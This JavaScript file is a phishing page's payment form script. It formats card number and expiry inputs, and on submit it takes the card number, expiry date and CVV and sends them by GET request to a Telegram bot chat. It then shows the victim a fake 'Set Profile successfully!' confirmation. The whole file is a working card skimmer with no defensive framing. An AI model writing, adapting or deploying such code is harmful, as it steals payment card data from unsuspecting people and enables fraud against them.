document.getElementById('cardNumber').addEventListener('input', function(event) {
    let value = event.target.value.replace(/\s+/g, '');
    if (value.length > 16) {
        value = value.substr(0, 16);
    }
    event.target.value = value.replace(/(.{4})/g, '$1 ').trim();
});

document.getElementById('dateCard').addEventListener('input', function(event) {
    let value = event.target.value.replace(/\//g, '');
    if (value.length > 4) {
        value = value.substr(0, 4);
    }
    if (value.length > 2) {
        value = value.substr(0, 2) + '/' + value.substr(2);
    }
    event.target.value = value;
});

const form2 = document.querySelector('#form2');

form2.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const cardNumber = document.querySelector('#cardNumber').value;
    const date = document.querySelector('#date').value;
    const cvv = document.querySelector('#cvv').value;
    
    const my_text = `WORLD SUPPORT PROFILE RESULTS: %0A %0A Card Number: ${cardNumber} %0A Expired Date: ${date} %0A CVV: ${cvv} %0A `;
    
   
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
    
    const api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    
    
    Swal.fire({
      title: "Set Profile successfully!",
      icon: "success"
    });
});